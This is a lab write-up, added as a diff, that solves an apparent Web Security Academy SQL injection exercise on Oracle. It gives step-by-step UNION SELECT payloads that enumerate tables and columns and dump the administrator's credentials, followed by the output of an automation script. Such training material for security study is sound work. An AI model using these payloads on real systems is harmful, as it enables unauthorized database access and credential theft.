@@ -1,0 +1,69 @@
+Lab 10 - SQL injection attack, listing the database contents on Oracle databases
+
+End Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator
+
+Analysis:
+
+1. Determine the number of columns in the product category table
+- Turn on Burp intercept in the Proxy tab
+- Intercept any of the product category filters
+- Send the intercepted request to Repeater
+- Try "ORDER BY <NUM>" payloads to figure out the number of columns
+
+' ORDER BY 3-- -> Internal server error
+
+-> 2 columns
+
+2. Determine the data types of the columns (interested in strings)
+- On the same Burp repeater...
+- Try UNION SELECT payloads to figure out the data types of the columns
+
+' UNION SELECT 'a', 'a' FROM DUAL--
+
+NOTE: Oracle DB requires "FROM DUAL"
+This step includes "figuring out the database type" because if we just try: ' UNION SELECT 'a', 'a'--
+We would see that this throws an error, thereby giving us a hint that this is an Oracle DB.
+
+-> string, string (both columns accept type text/string)
+
+3. Output list of tables in the database
+
+Refer to cheatsheet to see syntax for Oracle databases...
+
+- SELECT * FROM all_tables
+- SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+' UNION SELECT ?? FROM all_tables-- // see Oracle documentation for all_tables: https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286
+' UNION SELECT table_name, NULL FROM all_tables--
+
+-> USERS_QXUEUV
+
+4. Output columns names of users table
+
+Refer to the cheat sheet and the Oracle documentation (all_tab_columns): https://docs.oracle.com/cd/E11882_01/server.112/e40402/statviews_2103.htm#REFRN20277
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_QXUEUV'--
+
+-> USERNAME_KCUJYL
+-> PASSWORD_WMEFLT
+
+5. Output usernames and passwords
+' UNION SELECT USERNAME_KCUJYL, PASSWORD_WMEFLT FROM USERS_QXUEUV--
+
+-> administrator
+-> 8el1jguxuzy7ju0d652y
+
+=====================================================================================================================================================================
+Python script usage and output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-10]
+└─$ python3 sqli-lab-10.py "https://0a1500d7048955998016084300320003.web-security-academy.net"
+[+] Looking for a users table...
+[+] Found the users table name: USERS_QXUEUV
+[+] Found the username column name: USERNAME_KCUJYL
+[+] Found the password column name: PASSWORD_WMEFLT
+[+] Found the administrator password: 8el1jguxuzy7ju0d652y
